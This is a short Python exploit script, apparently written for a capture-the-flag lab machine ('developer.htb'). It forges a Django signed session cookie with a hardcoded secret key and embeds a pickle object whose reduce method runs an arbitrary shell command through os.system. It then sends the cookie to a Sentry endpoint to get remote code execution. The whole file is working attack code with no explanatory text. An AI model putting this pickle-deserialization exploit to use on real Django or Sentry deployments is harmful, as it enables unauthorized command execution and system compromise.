import os
import django.contrib.sessions.serializers
import django.core.signing
import requests
import sys


cmd = sys.argv[1]
SECRET_KEY = 'c7f3a64aa184b7cbb1a7cbe9cd544913'
cookie = ".eJxrYKotZNQI5UxMLsksS80vSo9gY2BgKE7NKymqDGUpLk3Jj-ABChQEFyZaljmblJv7-hQyRXABhUpSi0uS8_OzM1PBWsrzi7JTU0KF4hNLSzLiS4tTi-KTEpOzU_NSQpUgxumVlmTmFOuB5PVccxMzcxyBLCeoGl4kfZkp3qylegCrOjNK:1m45xH:Zcs2GcAl2Knls_STRUkB22PKJlg"
newContent = django.core.signing.loads(cookie, key=SECRET_KEY,
                                       serializer=django.contrib.sessions.serializers.PickleSerializer,
                                       salt='django.contrib.sessions.backends.signed_cookies')


print("Orignal cookie content:\n" + str(newContent))

class PickleRce(object):
    def __reduce__(self):
        return os.system, (cmd,)


newContent['testcookie'] = PickleRce()

print("Modified cookie content:\n" + str(newContent))

cookie = django.core.signing.dumps(newContent, key=SECRET_KEY,
                                   serializer=django.contrib.sessions.serializers.PickleSerializer,
                                   salt='django.contrib.sessions.backends.signed_cookies', compress=True)
print("Forged cookie:\n" + cookie)

requests.get("http://developer-sentry.developer.htb/sentry/", cookies={"sentrysid": cookie})
